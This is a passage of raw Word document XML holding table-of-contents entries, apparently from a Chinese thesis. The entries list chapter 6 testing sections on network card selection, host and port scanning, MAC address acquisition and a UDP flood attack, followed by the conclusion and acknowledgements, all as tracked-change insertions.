            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522664 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="248" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>45</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5F168B21" w14:textId="1B5A0629" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="249" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="250" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522665"</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6.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>程序测试</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522665 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="251" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>45</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7EE44AC0" w14:textId="16BC19B9" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="252" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="253" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522666"</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6.3.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>选择网卡</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522666 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="254" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>45</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="171498D2" w14:textId="6F2B2A22" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="255" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="256" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522667"</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6.3.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主机扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522667 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="257" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>46</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0C376784" w14:textId="6A73B1C2" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="258" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="259" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522668"</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6.3.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>MAC地址获取</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522668 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="260" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>48</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="448AE169" w14:textId="6862E74E" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="261" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="262" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522669"</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6.3.4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>端口扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522669 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="263" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>48</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1EF6444D" w14:textId="7151216F" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="264" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="265" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522670"</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6.3.5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP Flood攻击</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522670 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="266" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>49</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="68A6F890" w14:textId="1314F00C" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="267" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="268" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522671"</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6.4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>本章小结</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522671 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="269" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>50</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="689AAE29" w14:textId="6D585147" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="270" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="271" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522672"</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结论</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522672 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="272" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>51</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="111852C8" w14:textId="19693001" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="273" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="274" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522673"</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致谢</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522673 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="275" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>52</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6D2C8E1B" w14:textId="3FE2E8DA" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="276" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
